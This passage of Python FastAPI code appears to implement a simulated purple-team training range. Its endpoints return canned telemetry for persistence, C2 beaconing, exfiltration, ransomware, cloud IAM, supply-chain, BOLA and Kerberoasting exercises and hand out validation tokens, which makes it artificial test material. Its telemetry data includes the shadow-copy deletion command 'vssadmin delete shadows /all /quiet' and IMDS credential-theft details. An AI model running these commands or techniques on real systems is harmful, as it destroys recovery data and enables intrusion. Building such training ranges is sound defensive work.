        "status": "PURPLE_PERSIST_GATEWAY_ACTIVE",
        "service": "Persistence Mechanisms Emulation & Eradication Gateway",
        "port": 8308,
        "exercise_id": "PT-2026-008",
    })


@purple_persist_app.get("/api/persistence/telemetry")
def purple_persist_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "PERSISTENCE_TELEMETRY",
        "technique": "T1053.005",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "target_task": r"\Microsoft\Windows\Customer Experience\TelemetryUpdate",
        "events": [
            {
                "event_id": 4698,
                "event_name": "A scheduled task was created",
                "task_name": r"\Microsoft\Windows\Customer Experience\TelemetryUpdate",
                "action_command": r"C:\Windows\Temp\updater.ps1",
                "trigger": "ONLOGON",
                "user_context": "NT AUTHORITY\\SYSTEM",
                "timestamp": "2026-11-15T12:20:11Z",
            }
        ],
    })


@purple_persist_app.post("/api/persistence/emulate")
async def purple_persist_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_persist_state(sess_id)
    tname = str(body.get("task_name", "SecurityTelemetryUpdate")).strip()

    state["persistence_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "PERSISTENCE_EMULATION_VERIFIED",
        "verification_token": "PERSISTENCE_EMULATION_VERIFIED",
        "technique": "T1053.005",
        "task_name": tname,
        "message": f"Scheduled task persistence emulated; Event ID 4698 logged for '{tname}'.",
    })


@purple_persist_app.post("/api/persistence/remediate")
async def purple_persist_remediate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_persist_state(sess_id)
    state["task_remediated"] = True
    return JSONResponse({
        "status": "TASK_REMEDIATED_OK",
        "message": "Scheduled task eradicated and host state restored to clean baseline.",
    })


@purple_persist_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_persist_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_persist_state(sess_id)
        task_deleted = body.get("task_deleted") is True or state.get("task_remediated")
        if not (state.get("persistence_emulated") and task_deleted):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Scheduled task persistence must be emulated and eradicated before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "PERSIST" in action or action == "PERSISTENCE_REMEDIATION_VALIDATED":
            state["persistence_validated"] = True
            return JSONResponse({
                "status": "PERSISTENCE_REMEDIATION_VALIDATED",
                "verification_token": "PERSISTENCE_REMEDIATION_VALIDATED",
                "message": "Persistence remediation validated: scheduled task detected, eradicated, and baseline verified.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_PERSISTENCE_REMEDIATION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_PERSISTENCE_REMEDIATION').",
    })


# ============================================================================
# PURPLE ROOM 09: COMMAND & CONTROL (C2) TRAFFIC EMULATION (PORT 8309)
# ============================================================================

purple_c2_app = FastAPI(title="NO ENTRY Command & Control (C2) Emulation Hub")


@purple_c2_app.api_route("/", methods=["GET", "HEAD"])
def purple_c2_root():
    return JSONResponse({
        "status": "PURPLE_C2_GATEWAY_ACTIVE",
        "service": "Command & Control (C2) Traffic Emulation Hub",
        "port": 8309,
        "exercise_id": "PT-2026-009",
    })


@purple_c2_app.get("/api/c2/telemetry")
def purple_c2_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "C2_BEACON_TELEMETRY",
        "technique": "T1071.001",
        "technique_name": "Application Layer Protocol: Web Protocols",
        "request_path": "/api/v1/ping",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Trident/7.0",
        "sleep_interval": 15,
        "jitter": 20,
        "events": [
            {
                "timestamp": "2026-11-15T13:00:15Z",
                "src_ip": "10.10.14.10",
                "dst_ip": "10.10.14.90",
                "dst_port": 8309,
                "method": "POST",
                "uri": "/api/v1/ping",
                "bytes_out": 240,
                "status_code": 200,
            },
            {
                "timestamp": "2026-11-15T13:00:32Z",
                "src_ip": "10.10.14.10",
                "dst_ip": "10.10.14.90",
                "dst_port": 8309,
                "method": "POST",
                "uri": "/api/v1/ping",
                "bytes_out": 240,
                "status_code": 200,
            }
        ],
    })


@purple_c2_app.post("/api/c2/emulate")
async def purple_c2_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_c2_state(sess_id)
    path = str(body.get("target_path", "/api/v1/ping")).strip()

    state["c2_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "C2_BEACON_EMULATION_VERIFIED",
        "verification_token": "C2_BEACON_EMULATION_VERIFIED",
        "technique": "T1071.001",
        "target_path": path or "/api/v1/ping",
        "message": "C2 beaconing emulation active: periodic HTTP callbacks generated with 20% jitter.",
    })


@purple_c2_app.post("/api/c2/tune-detection")
async def purple_c2_tune_detection(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_c2_state(sess_id)
    state["detection_tuned"] = True
    return JSONResponse({
        "status": "DETECTION_TUNED_OK",
        "message": "Statistical beacon detection rule enabled to flag low-variance periodic flows.",
    })


@purple_c2_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_c2_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_c2_state(sess_id)
        if not (state.get("c2_emulated") and state.get("detection_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: C2 beaconing must be emulated and detection rule tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "C2" in action or action == "C2_DETECTION_VALIDATED":
            state["c2_validated"] = True
            return JSONResponse({
                "status": "C2_DETECTION_VALIDATED",
                "verification_token": "C2_DETECTION_VALIDATED",
                "message": "C2 traffic emulation exercise complete: beaconing detected, analyzed, and defensive rule validated.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_C2_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_C2_DETECTION').",
    })


# ============================================================================
# PURPLE ROOM 10: EMULATING DATA EXFILTRATION TECHNIQUES (PORT 8310)
# ============================================================================

purple_exfil_app = FastAPI(title="NO ENTRY Data Exfiltration & DLP Hub")


@purple_exfil_app.api_route("/", methods=["GET", "HEAD"])
def purple_exfil_root():
    return JSONResponse({
        "status": "PURPLE_EXFIL_GATEWAY_ACTIVE",
        "service": "Data Exfiltration & DLP Validation Hub",
        "port": 8310,
        "exercise_id": "PT-2026-010",
    })


@purple_exfil_app.get("/api/exfil/telemetry")
def purple_exfil_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "EXFILTRATION_TELEMETRY",
        "technique": "T1560.001",
        "technique_name": "Archive Collected Data: Archive via Utility",
        "staging_directory": "/tmp/.staging_vault",
        "archive_name": "db_export.7z",
        "bytes_transferred": 48200000,
        "destination_ip": "198.51.100.88",
        "events": [
            {
                "timestamp": "2026-11-15T13:10:02Z",
                "action": "STAGE_ARCHIVE",
                "staging_path": "/tmp/.staging_vault/db_export.7z",
                "file_count": 14,
                "archive_size_bytes": 48200000,
            },
            {
                "timestamp": "2026-11-15T13:10:45Z",
                "action": "NETWORK_EGRESS",
                "dest_ip": "198.51.100.88",
                "dest_port": 443,
                "bytes_sent": 48200000,
                "protocol": "HTTPS_POST",
            }
        ],
    })


@purple_exfil_app.post("/api/exfil/emulate")
async def purple_exfil_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_exfil_state(sess_id)
    bytes_sent = int(body.get("bytes", 48200000))

    state["exfil_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "EXFILTRATION_EMULATION_VERIFIED",
        "verification_token": "EXFILTRATION_EMULATION_VERIFIED",
        "technique": "T1560.001",
        "bytes_transferred": bytes_sent,
        "message": "Data staging and exfiltration emulation executed; archive chunk transferred.",
    })


@purple_exfil_app.post("/api/exfil/tune-dlp")
async def purple_exfil_tune_dlp(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_exfil_state(sess_id)
    state["dlp_tuned"] = True
    return JSONResponse({
        "status": "DLP_TUNED_OK",
        "message": "Defensive DLP volume threshold and sensitive directory staging rule deployed.",
    })


@purple_exfil_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_exfil_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_exfil_state(sess_id)
        if not (state.get("exfil_emulated") and state.get("dlp_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Data exfiltration must be emulated and DLP rules tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "EXFIL" in action or action == "EXFILTRATION_DETECTION_VALIDATED":
            state["exfil_validated"] = True
            return JSONResponse({
                "status": "EXFILTRATION_DETECTION_VALIDATED",
                "verification_token": "EXFILTRATION_DETECTION_VALIDATED",
                "message": "Exfiltration detection challenge complete: staging identified and unauthorized transfer blocked by DLP.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_EXFILTRATION_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_EXFILTRATION_DETECTION').",
    })


# ============================================================================
# PURPLE ROOM 11: RANSOMWARE ATTACK EMULATION & READINESS (PORT 8311)
# ============================================================================

purple_ransomware_app = FastAPI(title="NO ENTRY Ransomware Readiness & Canary Hub")


@purple_ransomware_app.api_route("/", methods=["GET", "HEAD"])
def purple_ransomware_root():
    return JSONResponse({
        "status": "PURPLE_RANSOMWARE_GATEWAY_ACTIVE",
        "service": "Ransomware Readiness & Canary Validation Hub",
        "port": 8311,
        "exercise_id": "PT-2026-011",
    })


@purple_ransomware_app.get("/api/ransomware/telemetry")
def purple_ransomware_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "RANSOMWARE_PRECURSOR_TELEMETRY",
        "technique": "T1490",
        "technique_name": "Inhibit System Recovery",
        "precursor_command": "vssadmin delete shadows /all /quiet",
        "canary_file": "finance_q4_canary.xlsx",
        "canary_path": "/home/operator/decoy/finance_q4_canary.xlsx",
        "events": [
            {
                "timestamp": "2026-11-15T13:20:11Z",
                "process_name": "vssadmin.exe",
                "command_line": "vssadmin delete shadows /all /quiet",
                "user": "NT AUTHORITY\\SYSTEM",
                "event_id": 4688,
            },
            {
                "timestamp": "2026-11-15T13:20:14Z",
                "process_name": "crypto_sim.exe",
                "file_accessed": "/home/operator/decoy/finance_q4_canary.xlsx",
                "access_type": "WRITE_ACCESS",
                "alert": "CANARY_FILE_TOUCH_DETECTED",
            }
        ],
    })


@purple_ransomware_app.post("/api/ransomware/emulate")
async def purple_ransomware_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_ransomware_state(sess_id)
    canary = str(body.get("canary_touched", "finance_q4_canary.xlsx")).strip()

    state["ransomware_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "RANSOMWARE_EMULATION_VERIFIED",
        "verification_token": "RANSOMWARE_EMULATION_VERIFIED",
        "technique": "T1490",
        "canary_touched": canary or "finance_q4_canary.xlsx",
        "message": "Ransomware precursor behavior emulated; canary decoy file access logged.",
    })


@purple_ransomware_app.post("/api/ransomware/tune-canary")
async def purple_ransomware_tune_canary(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_ransomware_state(sess_id)
    state["canary_tuned"] = True
    return JSONResponse({
        "status": "CANARY_TUNED_OK",
        "message": "Canary tripwire detection rule deployed with automated endpoint isolation action.",
    })


@purple_ransomware_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_ransomware_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_ransomware_state(sess_id)
        if not (state.get("ransomware_emulated") and state.get("canary_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Ransomware precursors must be emulated and canary rules tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "RANSOMWARE" in action or action == "RANSOMWARE_READINESS_VALIDATED":
            state["ransomware_validated"] = True
            return JSONResponse({
                "status": "RANSOMWARE_READINESS_VALIDATED",
                "verification_token": "RANSOMWARE_READINESS_VALIDATED",
                "message": "Ransomware readiness challenge validated: precursor behaviors and canary touch triggered automated containment.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_RANSOMWARE_READINESS')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_RANSOMWARE_READINESS').",
    })


# ============================================================================
# PURPLE ROOM 12: CLOUD IDENTITY & IAM PRIVILEGE ESCALATION (PORT 8312)
# ============================================================================

purple_cloud_app = FastAPI(title="NO ENTRY Cloud Identity & IAM Hub")


@purple_cloud_app.api_route("/", methods=["GET", "HEAD"])
def purple_cloud_root():
    return JSONResponse({
        "status": "PURPLE_CLOUD_GATEWAY_ACTIVE",
        "service": "Cloud Identity & IAM Privilege Escalation Emulation Hub",
        "port": 8312,
        "exercise_id": "PT-2026-012",
    })


@purple_cloud_app.get("/api/cloud/telemetry")
def purple_cloud_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "CLOUD_IDENTITY_TELEMETRY",
        "technique": "T1552.005",
        "technique_name": "Unsecured Credentials: Cloud Instance Metadata API",
        "imds_ip": "169.254.169.254",
        "assumed_role": "ProdSecOpsAdminRole",
        "source_identity": "app-workload-role",
        "api_call": "sts:AssumeRole",
        "events": [
            {
                "timestamp": "2026-11-15T13:30:11Z",
                "event_source": "sts.amazonaws.com",
                "event_name": "AssumeRole",
                "source_ip": "10.10.14.10",
                "userIdentity": {
                    "type": "AssumedRole",
                    "arn": "arn:aws:iam::123456789012:role/app-workload-role",
                },
                "requestParameters": {
                    "roleArn": "arn:aws:iam::123456789012:role/ProdSecOpsAdminRole",
                    "roleSessionName": "operator_cloud_session",
                },
            }
        ],
    })


@purple_cloud_app.post("/api/cloud/emulate")
async def purple_cloud_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_cloud_state(sess_id)
    role = str(body.get("target_role", "ProdSecOpsAdminRole")).strip()

    state["cloud_iam_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "CLOUD_IAM_EMULATION_VERIFIED",
        "verification_token": "CLOUD_IAM_EMULATION_VERIFIED",
        "technique": "T1552.005",
        "assumed_role": role or "ProdSecOpsAdminRole",
        "message": "Cloud IMDS query and IAM role assumption emulated; CloudTrail event generated.",
    })


@purple_cloud_app.post("/api/cloud/tune-pipeline")
async def purple_cloud_tune_pipeline(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_cloud_state(sess_id)
    state["pipeline_tuned"] = True
    return JSONResponse({
        "status": "PIPELINE_TUNED_OK",
        "message": "CloudTrail anomaly detection alert pipeline enabled for high-privilege AssumeRole calls.",
    })


@purple_cloud_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_cloud_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_cloud_state(sess_id)
        if not (state.get("cloud_iam_emulated") and state.get("pipeline_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Cloud role assumption must be emulated and alert pipeline tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "CLOUD" in action or action == "CLOUD_IDENTITY_DETECTION_VALIDATED":
            state["cloud_validated"] = True
            return JSONResponse({
                "status": "CLOUD_IDENTITY_DETECTION_VALIDATED",
                "verification_token": "CLOUD_IDENTITY_DETECTION_VALIDATED",
                "message": "Cloud identity privilege escalation challenge validated: IMDS token theft and cross-role assumption detected.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_CLOUD_IDENTITY_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_CLOUD_IDENTITY_DETECTION').",
    })


# ============================================================================
# PURPLE ROOM 13: SUPPLY CHAIN & DEPENDENCY CONFUSION (PORT 8313)
# ============================================================================

purple_supply_chain_app = FastAPI(title="NO ENTRY Supply Chain Security & Artifact Hub")


@purple_supply_chain_app.api_route("/", methods=["GET", "HEAD"])
def purple_supply_chain_root():
    return JSONResponse({
        "status": "PURPLE_SUPPLY_CHAIN_GATEWAY_ACTIVE",
        "service": "Supply Chain & Dependency Confusion Validation Hub",
        "port": 8313,
        "exercise_id": "PT-2026-013",
    })


@purple_supply_chain_app.get("/api/supply-chain/telemetry")
def purple_supply_chain_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "SUPPLY_CHAIN_TELEMETRY",
        "technique": "T1195.001",
        "technique_name": "Supply Chain Compromise: Compromise Software Dependencies",
        "target_package": "voltcorp-internal-auth",
        "private_registry": "https://artifacts.voltcorp.internal/repository/pypi-private/",
        "public_registry": "https://pypi.org/simple/",
        "events": [
            {
                "timestamp": "2026-11-15T14:00:10Z",
                "event_type": "DEPENDENCY_QUERY",
                "package_requested": "voltcorp-internal-auth",
                "internal_version": "1.4.2",
                "public_version_detected": "99.0.0",
                "resolved_source": "https://pypi.org/simple/voltcorp-internal-auth/",
                "alert": "UNSCOPED_INTERNAL_PACKAGE_PUBLIC_SUBSTITUTION",
            }
        ],
    })


@purple_supply_chain_app.post("/api/supply-chain/emulate")
async def purple_supply_chain_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_supply_chain_state(sess_id)
    pkg = str(body.get("package_name", "voltcorp-internal-auth")).strip()

    state["supply_chain_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "SUPPLY_CHAIN_EMULATION_VERIFIED",
        "verification_token": "SUPPLY_CHAIN_EMULATION_VERIFIED",
        "technique": "T1195.001",
        "package_name": pkg or "voltcorp-internal-auth",
        "message": "Dependency confusion package release emulated: public version 99.0.0 took resolution priority.",
    })


@purple_supply_chain_app.post("/api/supply-chain/tune-pinning")
async def purple_supply_chain_tune_pinning(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_supply_chain_state(sess_id)
    state["pinning_tuned"] = True
    return JSONResponse({
        "status": "PINNING_TUNED_OK",
        "message": "Private registry scope pinning enforced and SHA-256 package hash verification enabled.",
    })


@purple_supply_chain_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_supply_chain_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_supply_chain_state(sess_id)
        if not (state.get("supply_chain_emulated") and state.get("pinning_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Dependency confusion must be emulated and scope pinning tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "SUPPLY" in action or action == "SUPPLY_CHAIN_DETECTION_VALIDATED":
            state["supply_chain_validated"] = True
            return JSONResponse({
                "status": "SUPPLY_CHAIN_DETECTION_VALIDATED",
                "verification_token": "SUPPLY_CHAIN_DETECTION_VALIDATED",
                "message": "Supply chain security challenge validated: un-scoped package resolution blocked and hash pinning enforced.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_SUPPLY_CHAIN_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_SUPPLY_CHAIN_DETECTION').",
    })


# ============================================================================
# PURPLE ROOM 14: API SECURITY & BROKEN OBJECT LEVEL AUTH (PORT 8314)
# ============================================================================

purple_api_abuse_app = FastAPI(title="NO ENTRY API Security & Gateway Hub")


@purple_api_abuse_app.api_route("/", methods=["GET", "HEAD"])
def purple_api_abuse_root():
    return JSONResponse({
        "status": "PURPLE_API_ABUSE_GATEWAY_ACTIVE",
        "service": "API Security & BOLA Validation Hub",
        "port": 8314,
        "exercise_id": "PT-2026-014",
    })


@purple_api_abuse_app.get("/api/api-abuse/telemetry")
def purple_api_abuse_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "API_ACCESS_TELEMETRY",
        "technique": "T1190",
        "technique_name": "Exploit Public-Facing Application",
        "owasp_category": "API1:2023 - Broken Object Level Authorization (BOLA)",
        "endpoint": "/api/v1/accounts/{account_id}/profile",
        "target_account_id": "ACC-9042",
        "requesting_user": "operator_dev_01",
        "events": [
            {
                "timestamp": "2026-11-15T14:10:05Z",
                "method": "GET",
                "path": "/api/v1/accounts/ACC-9042/profile",
                "caller_principal": "operator_dev_01",
                "caller_assigned_account": "ACC-1001",
                "object_owner": "corp_exec_9042",
                "status_code": 200,
                "alert": "CROSS_TENANT_OBJECT_ACCESS_ATTEMPT",
            }
        ],
    })


@purple_api_abuse_app.post("/api/api-abuse/emulate")
async def purple_api_abuse_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_api_abuse_state(sess_id)
    target_acc = str(body.get("target_account_id", "ACC-9042")).strip()

    state["bola_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "BOLA_EMULATION_VERIFIED",
        "verification_token": "BOLA_EMULATION_VERIFIED",
        "technique": "T1190",
        "target_account_id": target_acc or "ACC-9042",
        "message": "BOLA parameter manipulation emulated: cross-tenant record retrieval executed successfully.",
    })


@purple_api_abuse_app.post("/api/api-abuse/tune-gateway")
async def purple_api_abuse_tune_gateway(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_api_abuse_state(sess_id)
    state["gateway_tuned"] = True
    return JSONResponse({
        "status": "GATEWAY_TUNED_OK",
        "message": "API Gateway context-aware authorization policy deployed and rate limiting enabled.",
    })


@purple_api_abuse_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_api_abuse_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_api_abuse_state(sess_id)
        if not (state.get("bola_emulated") and state.get("gateway_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: BOLA parameter tampering must be emulated and gateway rules tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "API" in action or action == "API_ABUSE_DETECTION_VALIDATED":
            state["api_abuse_validated"] = True
            return JSONResponse({
                "status": "API_ABUSE_DETECTION_VALIDATED",
                "verification_token": "API_ABUSE_DETECTION_VALIDATED",
                "message": "API security challenge complete: BOLA parameter tampering detected, blocked, and audited.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_API_ABUSE_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_API_ABUSE_DETECTION').",
    })


# ============================================================================
# PURPLE ROOM 15: ACTIVE DIRECTORY ATTACKS EMULATION (PORT 8315)
# ============================================================================

purple_ad_attacks_app = FastAPI(title="NO ENTRY Active Directory & Kerberos Hub")


@purple_ad_attacks_app.api_route("/", methods=["GET", "HEAD"])
def purple_ad_attacks_root():
    return JSONResponse({
        "status": "PURPLE_AD_ATTACKS_GATEWAY_ACTIVE",
        "service": "Active Directory Attacks & Kerberoasting Hub",
        "port": 8315,
        "exercise_id": "PT-2026-015",
    })


@purple_ad_attacks_app.get("/api/ad-attacks/telemetry")
def purple_ad_attacks_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "KERBEROS_AUDIT_TELEMETRY",
        "technique": "T1558.003",
        "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
        "event_id": 4769,
        "event_description": "A Kerberos service ticket was requested",
        "target_spn": "MSSQLSvc/db-prod.voltcorp.internal:1433",
        "service_account": "svc_sql_production",
        "ticket_encryption_type": "0x17",
        "encryption_name": "RC4-HMAC",
        "events": [
            {
                "timestamp": "2026-11-15T14:20:14Z",
                "event_id": 4769,
                "service_name": "svc_sql_production",
                "service_sid": "S-1-5-21-991204-1002",
                "client_address": "10.10.14.10",
                "ticket_encryption_type": "0x17",
                "ticket_options": "0x40810000",
                "alert": "ANOMALOUS_RC4_TGS_REQUEST_BURST",
            }
        ],
    })


@purple_ad_attacks_app.post("/api/ad-attacks/emulate")
async def purple_ad_attacks_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_ad_attacks_state(sess_id)
    spn = str(body.get("target_spn", "MSSQLSvc/db-prod.voltcorp.internal:1433")).strip()

    state["kerberoasting_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "KERBEROASTING_EMULATION_VERIFIED",
        "verification_token": "KERBEROASTING_EMULATION_VERIFIED",
        "technique": "T1558.003",
        "target_spn": spn or "MSSQLSvc/db-prod.voltcorp.internal:1433",
        "message": "Kerberos TGS ticket acquired for SPN; RC4-HMAC ticket encrypted with service account password hash.",
    })


@purple_ad_attacks_app.post("/api/ad-attacks/tune-dc-rule")
async def purple_ad_attacks_tune_dc_rule(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_purple_ad_attacks_state(sess_id)
    state["dc_rule_tuned"] = True
    return JSONResponse({
        "status": "DC_RULE_TUNED_OK",
        "message": "Domain Controller Event ID 4769 RC4 encryption alert rule deployed with threshold correlation.",
    })


@purple_ad_attacks_app.api_route("/challenge", methods=["GET", "POST"])
async def purple_ad_attacks_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_purple_ad_attacks_state(sess_id)
        if not (state.get("kerberoasting_emulated") and state.get("dc_rule_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Kerberoasting must be emulated and DC detection rule tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "AD" in action or action == "AD_ATTACK_DETECTION_VALIDATED":
            state["ad_attack_validated"] = True
            return JSONResponse({
                "status": "AD_ATTACK_DETECTION_VALIDATED",
                "verification_token": "AD_ATTACK_DETECTION_VALIDATED",
                "message": "Active Directory Kerberoasting challenge validated: TGS request detected and DC monitoring verified.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_AD_ATTACK_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Method Not Allowed. Submit POST with action ('VALIDATE_AD_ATTACK_DETECTION').",
    })


# ============================================================================
# PURPLE ROOM 16: CI/CD PIPELINE ATTACK EMULATION (PORT 8316)
# ============================================================================

